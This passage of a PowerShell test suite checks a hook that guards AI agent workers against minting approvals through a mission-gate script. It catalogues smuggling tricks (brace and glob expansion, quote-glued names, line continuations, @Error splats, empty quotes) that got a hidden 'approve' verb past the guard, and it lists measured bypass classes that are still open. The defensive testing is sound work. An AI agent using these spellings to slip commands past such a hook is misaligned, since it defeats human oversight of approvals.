    the base of this edit; the byte-identical command from the orchestrator seat returned exit 0.
    The cure is a predicate consulted as the FIRST CLAUSE of Test-EvidenceWorkerPlanePath, which can
    only ever SUPPRESS that rule's deny and returns false for everything it does not recognise.
      now-admits / still-admits rows allowed : $h8AllowOk of $h8Allow
      still-refused rows denied              : $h8DenyOk of $h8Deny
      divergences                            : $h8Bad   (expect 0)
      table reached                          : $h8Reached   (expect True -- 37 deny rows, 10 allow rows)
      hook payload cwd, table and seat rows  : $h8Cwd -- $h8CwdHow
      LINE 2, from the SEAT, on its own sentence (protected tier) : $h8L2Ok   (expect True)
      LINE 3, from the SEAT, on a dispatches path (metacharacter) : $h8L3Ok   (expect True)
      A1's captured decision function, asked DIRECTLY             : $h8A1Ok   (expect True)
        hash of a dispatch face -> $($h8A1Allow.decision)   (expect allow -- A1's own copy of the rule, governed by this build's predicate)
        copy onto a dispatch face -> $($h8A1Deny.decision)   (expect deny -- the control that proves A1 is still deciding)
        hash of the evidence plane -> $($h8A1EvidenceDeny.decision)   (expect deny)
        the same hash with the process standing INSIDE the plane -> $($h8A1InPlane.decision)   (expect deny -- the disclosed cwd fail-closed)
      denial records, all outcome denied     : $h8RecOk   (expect True, at least $h8Deny records, got $($h8Recs.Count))
      predicate asked directly               : $h8PredOk   (expect True)
        permitted hash        -> $h8p1   (expect True)
        evidence-plane hash   -> $h8p2   (expect False)
        copy onto a face      -> $h8p3   (expect False -- unknown verb)
        verb with no path     -> $h8p4   (expect False -- C6)
        bare path, no verb    -> $h8p5   (expect False -- this is the file-tool shape)
        empty text            -> $h8p6   (expect False)
$($h8Lines -join ([string][char]10))
    WHY THIS IS NOT THE EARLIER ERRATUM'S MISTAKE. That erratum deleted a read-only VERB list because the list
    asserted "this verb cannot modify the filesystem" -- a claim over every flag of every tool, which
    nobody can enumerate, which is why it was audited clean twice and was wrong twice. This predicate
    asserts something CHECKABLE: one segment, no metacharacter, a verb from a closed set, flags from a
    closed per-verb set carrying no output option, no token with an equals sign, and every path token
    that names the plane resolving -- in EVERY form -- inside two named directories. Rows r24 and r25
    are that erratum's own counterexamples re-run against it.
    THE HONEST BOUNDS, carried rather than argued away. (1) A verb with an output option nobody has
    found could still clobber a file inside those two directories -- bounded there, recorded either
    way, and a clobbered face does not re-derive against its committed hash chain. (2) A DIRECTORY
    under the two roots satisfies the path clause; a hashing verb handed a directory reads nothing
    and writes nothing. (3) The form builder resolves dot segments, short names and globs, but NOT
    reparse points, so a junction or symlink planted inside a permitted directory would be judged by
    its name. Creating one is refused for every role by the link-creation rule, which was measured
    doing exactly that against this author's own attempt to build such a fixture. The guard's standing is
    unchanged: a tripwire, not a boundary.
"@
Check -Id 'H-8' -Title 'a dispatched worker may HASH a dispatch face and a contract artifact, and every write, move, delete, chain, metacharacter, unknown verb, unknown flag, traversal and evidence-plane reach stays refused -- including through the SEALED A1 copy of the rule' `
      -Ok (($h8Bad -eq 0) -and $h8Reached -and $h8L2Ok -and $h8L3Ok -and $h8A1Ok -and $h8RecOk -and $h8PredOk) -Detail $h8detail

# =============================================================================================
# H-17 -- THE GUARD MODELS mission-gate.ps1's -Reason, AND (b1s6) A VALUE THE SHELL SIZES IS REFUSED
#         (a residual first registered as not claimed, then closed and extended in two later revisions)
# =============================================================================================
# A LATER REVISION EXTENDED THIS MEMBER. An earlier one added `reason` to the model and a
# shell-decided-value guard for the empty-quote/%VAR%/!VAR! shapes, and claimed it "did not widen a
# fail-open". A read-only reader then REFUTED that: a brace, a glob, a $1/$@ word-split, a PowerShell
# splat, a trailing-backslash continuation and a quote GLUED TO A PARAMETER NAME each bound
# Command=approve through the real hook -- a MINT, ALLOW at base. The operator ruled these
# into item 3's scope (treat `{`, `,`-in-braces and `*?[]` in a value slot as shell-decided, refuse the
# command; the addendum added quote-glued names, a line-continuation value, nested bash -c, a bare `*`
# and the help clause). The library's Test-EvidenceShellDecidedToken and
# Test-EvidenceGateToolValueParamShellDecided now refuse them; this member drives every shape below
# through the real hook, both roles and both shell tools. ADDS REFUSALS ONLY: deny->allow is 0 over the
# whole transition corpus (measured), and every new row is ALLOW at base -> DENY at this tip.
# REGISTERED EARLIER: mission-gate.ps1 declares [string]$Reason (used by
# revoke/reapprove) and $script:EvidenceGateToolValueParams did NOT carry `reason`, so the verb scan
# read -Reason's VALUE as a positional and a bare `list -Reason x` refused -- fail-closed, but a false
# refusal of the ratified `revoke ... -Reason` convention. THE OPERATOR DISPATCHED: admit it as a
# value-taking parameter, cases both ways. `reason` is now in the flat model (PowerShell binds it at
# script level whatever the verb), and the same edit adds the shell-decided-value guard that keeps the
# addition from minting a new spelling of the pre-existing empty-quote fail-open.
#
# CASES BOTH WAYS, DRIVEN THROUGH THE REAL HOOK. The now-admits half is the deliverable half here (a
# false refusal lifted), but the widening direction is what makes it dangerous, so the refuse half is
# larger: every empty-quoted / whitespace-quoted / cmd-expansion value in a value slot stays refused,
# the pre-existing -MissionRoot '' fail-open is CLOSED (measured ALLOW->DENY), and the one read verb
# `list` is unmoved. MEASURED AT THE BASE OF THIS EDIT THROUGH THIS HOOK: `list -Reason x`,
# `-Reason x list` and `list -MissionRoot . -Reason x` returned exit 2 / deny (the false refusal), and
# `-Reason list` and `-MissionRoot '' approve -Ruling list ...` returned exit 0 / allow (the value read
# as the verb, and the empty-quote fail-open). Each row's base verdict is on the row and in the detail.
#
# cwd IS A SCRATCH ROOT OUTSIDE ANY PROTECTED PATH, created and removed by this member -- NOT
# $repoRoot. An earlier revision recorded that a payload cwd carrying a protected component (a
# .claude/worktrees checkout) surfaces `.claude` beside the `?` of `-?` and the metacharacter tier
# then refuses the help-flag rows; H-17 carries a `-Reason -? approve` row, so it must not inherit that
# fragility. The cwd is removed in a finally.
$h17Cwd = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h17-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $h17Cwd -Force | Out-Null
$h17Id = 'session-wp1-am37'
$h17Dir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $h17Id
New-Item -ItemType Directory -Path $h17Dir -Force | Out-Null
$env:MISSION_DISPATCH_ID = $h17Id
Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
$mg17 = 'powershell -File tools/lam/mission-gate.ps1'
$sq17 = [string][char]39
$dq17 = [string][char]34
$h17Rows = @(
    # ---- MUST NOW ALLOW: the false refusal an earlier revision registered, lifted. base = DENY. ----------
    [pscustomobject]@{ id = 'a1'; deny = $false; base = 'DENY'; why = 'THE ROW: a read carrying a reason. -Reason now takes its value, so `list` is the lone verb. exit 2 / deny at base';
                       cmd = "$mg17 list -Reason x" }
    [pscustomobject]@{ id = 'a2'; deny = $false; base = 'DENY'; why = 'reason BEFORE the verb: PowerShell binds -Reason at script level, so order does not matter';
                       cmd = "$mg17 -Reason x list" }
    [pscustomobject]@{ id = 'a3'; deny = $false; base = 'DENY'; why = 'reason beside another value parameter: -MissionRoot . and -Reason x both consume, `list` is still the verb';
                       cmd = "$mg17 list -MissionRoot . -Reason x" }
    # ---- MUST STAY / BECOME REFUSED: everything the addition must not admit. ----------------------
    [pscustomobject]@{ id = 'd1'; deny = $true; base = 'DENY'; why = "THE MANDATORY DENY CONTROL: the register's exact mint convention. If this row ALLOWS the whole table is void";
                       cmd = "$mg17 approve -Kind push -MissionRoot ." }
    [pscustomobject]@{ id = 'd2'; deny = $true; base = 'DENY'; why = 'a MUTATING verb with its reason: the ratified revoke convention still mutates and is still refused';
                       cmd = "$mg17 revoke -Kind dispatch -Id x -Reason ${dq17}why${dq17}" }
    [pscustomobject]@{ id = 'd3'; deny = $true; base = 'DENY'; why = 'the value cannot MASQUERADE as the verb: -Reason consumes `list`, `revoke` is the positional, refused';
                       cmd = "$mg17 -Reason list revoke" }
    [pscustomobject]@{ id = 'd4'; deny = $true; base = 'ALLOW'; why = 'ALLOW->DENY: -Reason consumes `list`, leaving NO verb at all. At base the value `list` was read as the verb and admitted';
                       cmd = "$mg17 -Reason list" }
    [pscustomobject]@{ id = 'd5'; deny = $true; base = 'DENY'; why = 'THE WIDENING THE GUARD PREVENTS: naively adding `reason` would let -Reason swallow the empty quote and then `approve`, admitting a MINT. The shell-decided guard refuses it';
                       cmd = "$mg17 -Reason $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'd6'; deny = $true; base = 'ALLOW'; why = "ALLOW->DENY, THE HARDENING: the register's pre-existing -MissionRoot '' fail-open. The empty quote hid the verb `approve`; closed as a measured side effect";
                       cmd = "$mg17 -MissionRoot $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'd7'; deny = $true; base = 'ALLOW'; why = 'ALLOW->DENY: the DOUBLE-QUOTE spelling of the same empty-quote fail-open, closed too';
                       cmd = "$mg17 -MissionRoot $dq17$dq17 approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'd8'; deny = $true; base = 'DENY'; why = 'the value parameter CONSUMES `-?`: -Reason takes the next token whatever it looks like, so the help flag is its argument and `approve` is the verb, refused';
                       cmd = "$mg17 -Reason -? approve" }
    [pscustomobject]@{ id = 'd9'; deny = $true; base = 'DENY'; why = 'a cmd %E% expansion in the reason slot: its argument count is set by the environment, not the text -- unreadable, refused';
                       cmd = 'cmd /c powershell -File tools/lam/mission-gate.ps1 -Reason %E% list' }
    [pscustomobject]@{ id = 'd10'; deny = $true; base = 'DENY'; why = 'a cmd delayed !E! expansion under /v:on: the same, refused';
                       cmd = 'cmd /v:on /c powershell -File tools/lam/mission-gate.ps1 -Reason !E! list' }
    # ---- b1s6 ITEM 3: brace/glob/quote-glued/continuation/splat SHELL-DECIDED VALUES. Every one below was
    #      measured ALLOW at this build's base through THIS hook, DENY at this tip, seat==worker,
    #      both shell tools. base = 'ALLOW'. Each names mission-gate so its denial record is counted. --------
    [pscustomobject]@{ id = 'e1'; deny = $true; base = 'ALLOW'; why = 'BRACE: bash turns {x,approve} into TWO words, -Reason takes x and approve binds Command -- a MINT the guard read as one value beside a -Ruling list decoy';
                       cmd = "$mg17 -Reason {x,approve} -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e2'; deny = $true; base = 'ALLOW'; why = 'GLOB: a[ap]* in a cwd holding aa and approve is two words -> approve binds Command; refused by the glob character whatever the cwd (the guard cannot know a listing)';
                       cmd = "$mg17 -Reason a[ap]* -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e3'; deny = $true; base = 'ALLOW'; why = 'BRACE on -Id (pre-existing for an unmodelled-by-reason value param, now covered): -Id consumes {x,approve}, approve binds Command';
                       cmd = "$mg17 -Id {x,approve} -Ruling list -Kind push -Binds y" }
    [pscustomobject]@{ id = 'e4'; deny = $true; base = 'ALLOW'; why = 'BRACE on -Kind: {push,approve} splits, approve binds Command';
                       cmd = "$mg17 -Kind {push,approve} -Ruling list -Id x -Binds y" }
    [pscustomobject]@{ id = 'e5'; deny = $true; base = 'ALLOW'; why = 'ATTACHED brace -Reason:{x,approve} (the attached form)';
                       cmd = "$mg17 -Reason:{x,approve} -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e5b'; deny = $true; base = 'ALLOW'; why = 'ATTACHED-EQUALS brace -Id={a,b}';
                       cmd = "$mg17 -Id={a,b} -Ruling list -Kind push -Binds y" }
    [pscustomobject]@{ id = 'e6'; deny = $true; base = 'ALLOW'; why = 'GLOB on -MissionRoot with the verb after it: C:/a* is one word in an empty cwd but refused by the glob character';
                       cmd = "$mg17 -MissionRoot C:/a* list" }
    [pscustomobject]@{ id = 'e7'; deny = $true; base = 'ALLOW'; why = 'GLOB in a READ carrying a reason: x? is a glob';
                       cmd = "$mg17 list -Reason x?" }
    [pscustomobject]@{ id = 'e8'; deny = $true; base = 'ALLOW'; why = 'A ONE-WORD BRACE {a}: still shell-decided (the rule is the character, not the comma)';
                       cmd = "$mg17 list -Reason {a}" }
    [pscustomobject]@{ id = 'e9'; deny = $true; base = 'ALLOW'; why = 'QUOTE-GLUED NAME (addendum 1): -MissionRoot"" hid the empty-quote value from every shell-decided test while the verb scan still consumed it -- the earlier fail-open was NOT fully closed at base. bash words <-MissionRoot><><approve>';
                       cmd = "$mg17 -MissionRoot$dq17$dq17 $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e10'; deny = $true; base = 'ALLOW'; why = 'QUOTE-WRAPPED NAME: the raw token starts with a quote, so the name test skipped it at base. Same bash words as e9';
                       cmd = "$mg17 $sq17-MissionRoot$sq17 $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e11'; deny = $true; base = 'ALLOW'; why = 'QUOTE-GLUED NAME + brace value: -Id'''' {x,approve}, bash words <-Id><x><approve>';
                       cmd = "$mg17 -Id$sq17$sq17 {x,approve} -Ruling list -Kind push -Binds y" }
    [pscustomobject]@{ id = 'e12'; deny = $true; base = 'ALLOW'; why = 'LEADING-QUOTE NAME + brace value: ""-Id {x,approve}';
                       cmd = "$mg17 $dq17$dq17-Id {x,approve} -Ruling list -Kind push -Binds y" }
    [pscustomobject]@{ id = 'e13'; deny = $true; base = 'ALLOW'; why = 'LINE CONTINUATION (addendum 2): the segment split cuts at the newline, so the -Id value token is a lone backslash; bash joins the next line and approve binds Command';
                       cmd = ("$mg17 -Ruling list -Kind push -Binds y -Id \" + [char]10 + "x approve") }
    [pscustomobject]@{ id = 'e14'; deny = $true; base = 'ALLOW'; why = 'LINE CONTINUATION on -Reason (x3r; deny->allow at amendment 46, closed here)';
                       cmd = ("$mg17 -Ruling list -Kind push -Id x -Binds y -Reason \" + [char]10 + "x approve") }
    [pscustomobject]@{ id = 'e15'; deny = $true; base = 'ALLOW'; why = 'NESTED SHELL (fail-closed): the outer double quotes close, the inner bash brace-expands {x,approve}; quoting is ignored so the brace is seen';
                       cmd = ("bash -c " + $dq17 + "powershell -File tools/lam/mission-gate.ps1 -Reason " + $dq17 + $sq17 + "{x,approve}" + $sq17 + $dq17 + " -Ruling list -Kind push -Id x -Binds y" + $dq17) }
    [pscustomobject]@{ id = 'e16'; deny = $true; base = 'ALLOW'; why = 'A BARE GLOB * (x9; deny->allow at amendment 46): expands against the cwd, first match binds Command';
                       cmd = "$mg17 -Reason * -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e17'; deny = $true; base = 'ALLOW'; why = 'THE HELP CLAUSE it defeats: -MissionRoot {x,approve} -? was admitted by the help clause at base; the brace rule runs BEFORE the verb/help scan and refuses the brace first';
                       cmd = "$mg17 -MissionRoot {x,approve} -? -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e18'; deny = $true; base = 'ALLOW'; why = 'A POWERSHELL SPLAT: -Reason @Error hands the native tool one argument per element of an automatic variable no $ names; after two Write-Error calls it binds Reason=x, Command=approve (PowerShell tool)';
                       cmd = ("Write-Error -Message approve -ErrorAction SilentlyContinue; Write-Error -Message x -ErrorAction SilentlyContinue; $mg17 -Reason @Error -Ruling list -Kind push -Id x -Binds y") }
    [pscustomobject]@{ id = 'e19'; deny = $true; base = 'ALLOW'; why = 'ODD QUOTES ON A NAME: -Kind'' closes a quoted run, so -Reason ''x -Kind'' is one value and approve binds Command; tested on the name part';
                       cmd = "$mg17 -Reason ${sq17}x -Kind${sq17} approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e20'; deny = $true; base = 'ALLOW'; why = 'QUOTES-ONLY value: -Reason ''"'' is a lone literal quote to bash (one word), NOTHING to the quote-stripped scan; approve binds Command';
                       cmd = "$mg17 -Reason $sq17$dq17$sq17 approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'e21'; deny = $true; base = 'ALLOW'; why = 'COST, RECORDED: a QUOTED value carrying a glob character is refused too -- list -Reason ''why?'' is a false refusal in the safe direction (quoting is ignored)';
                       cmd = "$mg17 list -Reason ${sq17}why?${sq17}" }
    [pscustomobject]@{ id = 'e22'; deny = $true; base = 'ALLOW'; why = 'COST: a quoted glob in -MissionRoot -- list -MissionRoot "C:/a*b", a false refusal in the safe direction';
                       cmd = "$mg17 list -MissionRoot ${dq17}C:/a*b${dq17}" }
    # ---- b1s6 ITEM 3: a bare comma/}/@-free value is NOT shell-decided and STAYS ALLOWED. --------
    [pscustomobject]@{ id = 's1'; deny = $false; base = 'ALLOW'; why = 'a bare comma outside braces is one word in bash and one arg in PowerShell (measured) -- not an expansion, still a read';
                       cmd = "$mg17 list -Reason a,b" }
    [pscustomobject]@{ id = 's2'; deny = $false; base = 'ALLOW'; why = 'a closing brace WITHOUT an opening one is not brace expansion; x} is one word, still a read';
                       cmd = "$mg17 list -Reason x}" }
    [pscustomobject]@{ id = 's3'; deny = $false; base = 'ALLOW'; why = 'the comma value BEFORE the verb -- -Reason x,approve consumes one word, list is the lone verb';
                       cmd = "$mg17 -Reason x,approve list" }
)
$h17Lines = New-Object System.Collections.Generic.List[string]
$h17Bad = 0; $h17Deny = 0; $h17Allow = 0; $h17DenyOk = 0; $h17AllowOk = 0
try {
    foreach ($seat in @('seat', 'worker')) {
        # LAM_DISPATCH SET IN THIS PROCESS ONLY so the hook CHILD inherits it (H-8/H-9's idiom), and
        # removed after the table -- a leaked marker would silently make every later member a worker.
        if ($seat -eq 'worker') { $env:LAM_DISPATCH = $h17Id } else { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue }
        foreach ($tool in @('Bash', 'PowerShell')) {
            foreach ($r in $h17Rows) {
                $payload = @{
                    session_id      = $h17Id
                    hook_event_name = 'PreToolUse'
                    tool_name       = $tool
                    tool_input      = @{ command = $r.cmd }
                    cwd             = $h17Cwd
                } | ConvertTo-Json -Depth 8 -Compress
                $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
                $gotDeny = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
                $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
                $ok = if ($r.deny) { $gotDeny } else { $gotAllow }
                if ($r.deny) { $h17Deny++; if ($ok) { $h17DenyOk++ } } else { $h17Allow++; if ($ok) { $h17AllowOk++ } }
                if (-not $ok) { $h17Bad++ }
                [void]$h17Lines.Add(('      {0,-4} {1,-6} {2,-11} base={3,-5} want={4,-5} exit={5} {6}   {7}' -f
                    $r.id, $seat, $tool, $r.base, $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $res.exit,
                    $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
                [void]$h17Lines.Add('              ' + $r.why)
            }
        }
    }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
} finally {
    if (Test-Path -LiteralPath $h17Cwd) { Remove-Item -LiteralPath $h17Cwd -Recurse -Force -ErrorAction SilentlyContinue }
}
# THE MINT CONTROL, PULLED OUT AND JUDGED BY NAME (H-9's idiom). A table whose refusal rows had all
# quietly stopped firing would still read clean; this is the row that makes the table mean something.
$h17CtlBad = @($h17Lines | Where-Object { $_ -like '      d1 *' -and $_ -like '*DIVERGE*' }).Count
# NON-VACUITY: a table that lost its rows would report zero divergences and prove nothing.
# b1s6 item 3 grew the table: 33 deny rows x (2 seats x 2 tools) = 132; 6 allow rows x 4 = 24.
$h17Reached = ($h17Deny -eq 132 -and $h17Allow -eq 24)
# THE DENIAL IS RECORDED for every refused row (H-1d/H-7/H-9's idiom). A widening that silenced the
# record instead of moving the verdict would look identical from the exit code alone.
$h17Recs = @(Get-LogEntries -DispatchId $h17Id |
             Where-Object { [string](Get-EntryField $_ 'tool' '') -eq '_denied' } |
             Where-Object { ([string](Get-EntryField $_ 'command' '')) -like '*mission-gate*' })
$h17RecOk = ($h17Recs.Count -eq $h17Deny) -and
            (@($h17Recs | Where-Object { [string](Get-EntryField $_ 'outcome' '') -eq 'denied' }).Count -eq $h17Recs.Count)
# THE PREDICATE ASKED DIRECTLY at the edges, including the -Command fork that keeps `reason` from
# widening the -Command decoy fail-open (b1s5 item 3 fork; see the library helper's docblock).
$h17p1 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 list -Reason x")
$h17p2 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason x list")
$h17p3 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason list")
$h17p4 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y")
$h17p5 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -MissionRoot $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y")
$h17p6 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Command approve -Ruling list -Kind push -Id x -Binds y")
$h17p7 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Command approve -Reason x -Ruling list -Kind push -Id x -Binds y")
$h17p8 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 revoke -Kind dispatch -Id x -Reason ${dq17}why${dq17}")
# b1s6 item 3: the brace/glob/quote-glued/continuation/splat edges, and the two shapes that STAY allowed.
$h17i1  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason {x,approve} -Ruling list -Kind push -Id x -Binds y")   # brace
$h17i2  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason a[ap]* -Ruling list -Kind push -Id x -Binds y")        # glob
$h17i3  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason:{x,approve} -Ruling list -Kind push -Id x -Binds y")   # attached brace
$h17i4  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -MissionRoot$dq17$dq17 $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y")   # quote-glued name (x1)
$h17i5  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 $sq17-MissionRoot$sq17 $sq17$sq17 approve -Ruling list -Kind push -Id x -Binds y")   # quote-wrapped name (x2)
$h17i6  = [bool](Test-EvidenceGateToolMutation -Command ("$mg17 -Ruling list -Kind push -Binds y -Id \" + [char]10 + "x approve"))   # line continuation
$h17i7  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason @Error -Ruling list -Kind push -Id x -Binds y")        # splat
$h17i8  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason ${sq17}x -Kind${sq17} approve -Ruling list -Kind push -Id x -Binds y")   # odd quote on a name
$h17i9  = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -MissionRoot {x,approve} -? -Kind push -Id x -Binds y")        # help clause defeated by the brace rule
$h17i10 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 list -Reason a,b")   # bare comma stays allowed
$h17i11 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 list -Reason x}")    # lone } stays allowed
$h17i12 = [bool](Test-EvidenceGateToolMutation -Command "$mg17 -Reason x,approve list")   # comma before the verb stays allowed
$h17PredOk = (-not $h17p1) -and (-not $h17p2) -and $h17p3 -and $h17p4 -and $h17p5 -and $h17p6 -and $h17p7 -and $h17p8 -and
             $h17i1 -and $h17i2 -and $h17i3 -and $h17i4 -and $h17i5 -and $h17i6 -and $h17i7 -and $h17i8 -and $h17i9 -and
             (-not $h17i10) -and (-not $h17i11) -and (-not $h17i12)
# THE VALUE-PARAM MODEL IS A CLOSED LIST OF EXACTLY TEN, ASSERTED AS A SET. `reason` is the tenth; the
# four unmodelled parameters and the common parameters are deliberately ABSENT (adding one removes
# denials and was not dispatched).
$h17Vp = @($script:EvidenceGateToolValueParams)
$h17Expected = @('command', 'kind', 'id', 'binds', 'missionroot', 'tipsha', 'originurl', 'remoteref', 'expiresminutes', 'reason')
$h17ListOk = ($h17Vp.Count -eq 10) -and
             (@($h17Expected | Where-Object { $h17Vp -notcontains $_ }).Count -eq 0) -and
             (@($h17Vp | Where-Object { $h17Expected -notcontains $_ }).Count -eq 0)
# REGRESSION: every H-7 and H-9 ROW re-driven through the predicate, verdicts unchanged. Taken over
# THEIR row variables, not a copy, so the two cannot drift; the predicate is cwd-independent, so this
# needs no hook and no fixture.
$h17RegBad = 0
$h17RegLines = New-Object System.Collections.Generic.List[string]
foreach ($r in @($h7Rows + $h9Rows)) {
    $got = [bool](Test-EvidenceGateToolMutation -Command $r.cmd)
    $ok = ($got -eq [bool]$r.deny)
    if (-not $ok) { $h17RegBad++ }
    [void]$h17RegLines.Add(('      {0,-4} want={1,-5} got={2,-5} {3}   {4}' -f $r.id,
        $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $(if ($got) { 'DENY' } else { 'ALLOW' }),
        $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
}
$h17RegReached = ($h7Rows.Count -eq 12) -and ($h9Rows.Count -eq 12)
$h17detail = @"
    AMENDMENT 37 (3) -- the guard's model of mission-gate.ps1 lacked -Reason, so ``list -Reason x``
    refused (the value read as a positional). ``reason`` is now the tenth value-taking parameter, and the
    same change adds a guard so the addition cannot mint a new spelling of the empty-quote fail-open.
    Driven through the REAL hook for both roles and both shell tools, cwd a scratch root outside any
    protected path (amendment 40's H-9 fragility not inherited).
      now-admits rows allowed  : $h17AllowOk of $h17Allow
      still-refused rows denied : $h17DenyOk of $h17Deny
      divergences              : $h17Bad   (expect 0)
      table reached            : $h17Reached   (expect True -- 132 deny rows and 24 allow rows; b1s6 item 3 grew the table)
      MANDATORY MINT CONTROL d1 (approve -Kind push -MissionRoot .) diverged: $h17CtlBad   (expect 0)
      denial records naming mission-gate, all outcome denied : $h17RecOk   (expect True, $h17Deny records, got $($h17Recs.Count))
      value-param model is the CLOSED set of ten            : $h17ListOk   (expect True, got $($h17Vp -join ', '))
      predicate asked directly at the edges                 : $h17PredOk   (expect True)
        list -Reason x            -> $h17p1   (expect False -- the false refusal lifted)
        -Reason x list            -> $h17p2   (expect False -- order does not matter)
        -Reason list              -> $h17p3   (expect True  -- reason consumes ``list``, NO verb)
        -Reason '' approve ...    -> $h17p4   (expect True  -- shell-decided value; the widening prevented)
        -MissionRoot '' approve.. -> $h17p5   (expect True  -- the pre-existing fail-open, closed)
        -Command approve -Ruling  -> $h17p6   (expect True  -- the -Command fork: an explicit mint is not hidden)
        -Command approve -Reason x-> $h17p7   (expect True  -- the fork holds with reason present: no deny->allow to a mint)
        revoke ... -Reason "why"  -> $h17p8   (expect True  -- a mutating verb with its reason still mutates)
      b1s6 ITEM 3 edges asked directly (expect True except the three stays-allowed rows):
        -Reason {x,approve}       -> $h17i1   (expect True  -- brace)
        -Reason a[ap]*            -> $h17i2   (expect True  -- glob)
        -Reason:{x,approve}       -> $h17i3   (expect True  -- attached brace)
        -MissionRoot"" '' approve -> $h17i4   (expect True  -- quote-glued name, addendum 1; the earlier fail-open was NOT fully closed at base)
        '-MissionRoot' '' approve -> $h17i5   (expect True  -- quote-wrapped name)
        -Id \<LF>x approve        -> $h17i6   (expect True  -- line continuation, addendum 2)
        -Reason @Error            -> $h17i7   (expect True  -- PowerShell splat)
        -Reason 'x -Kind' approve -> $h17i8   (expect True  -- odd quote on a name)
        -MissionRoot {x} -?       -> $h17i9   (expect True  -- the brace rule runs before the help clause)
        list -Reason a,b          -> $h17i10  (expect False -- a bare comma is not an expansion)
        list -Reason x}           -> $h17i11  (expect False -- a lone } is not brace expansion)
        -Reason x,approve list    -> $h17i12  (expect False -- comma value, list is the verb)
$($h17Lines -join ([string][char]10))
      H-7 AND H-9 ROWS RE-DRIVEN THROUGH THE PREDICATE -- divergences: $h17RegBad   (expect 0); rows: $($h7Rows.Count)+$($h9Rows.Count) (expect 12+12)
$($h17RegLines -join ([string][char]10))
    THE DIRECTION OF EVERY TRANSITION: the three a-rows are DENY->base to ALLOW-now (the false refusal
    lifted); d4 (-Reason list) and d6/d7 (-MissionRoot ''/"" ) are ALLOW->base to DENY-now (a value that
    masqueraded as the verb, and the empty-quote fail-open, both closed); every other row is unchanged.
    WHAT IS NOT MODELLED, AND STAYS A FINDING: the four unmodelled parameters -Ruling, -ComposedAt,
    -ConsoleToken, -ConsoleCredential and common parameters such as -OutVariable are NOT in the model,
    because adding a value parameter REMOVES denials and was not dispatched -- so ``list -Ruling x``,
    ``list -ComposedAt x``, ``list -ConsoleToken x``, ``list -ConsoleCredential x`` and ``list -OutVariable x``
    are FALSE REFUSALS (the unmodelled switch's value read as a second positional); the ATTACHED
    -Command:<verb> / -Command=<verb> decoy shape, ALLOW here once, is REFUSED since H-20
    for a LITERAL value (a quoted literal already was), collected as the verb WITHIN THE TOOL'S SEGMENT.
    NOT REACHED, pre-existing (ALLOW at base and now) and not built -- register candidates recorded in
    LAM-ACCEPT amendment 49, not register rows (a register row is a mission-plane act) -- are THREE CLASSES,
    stated as classes so the record holds for spellings nobody has typed yet; every spelling below is a
    measured example, and H-20's header carries the full measured list. (1) SEVERING: the predicate's
    segment splits (; | && || newline, the single &, [()]+) are QUOTE-BLIND, so ANY argument BEFORE the
    verb carrying ; | & ( or ), quoted or not, severs the tool's segment and the decoy's list is its lone
    positional -- attached, separated or positional verb alike: ``-Ruling list -Id 'a;b' -Command:approve``
    (or 'a|b', 'a&b', ``-Binds 'y (1)'``) binds the verb from bash through -File and from the PowerShell
    tool alike, the PowerShell tool adding unquoted expressions such as ``-Kind ('push')`` and
    ``-Command:('approve')`` (a syntax error in bash); the parenthesised-expression, PowerShell-tool-only
    boundary written here earlier was WRONG and is withdrawn. (2) A PARAMETER NAME THE SHELL
    TRANSFORMS: only a name part reaching the guard LITERALLY as a prefix of command is recognised; a name
    carrying a character a shell escapes or expands -- \ or ^ (escapes), { } (bash brace), dollar-digit or
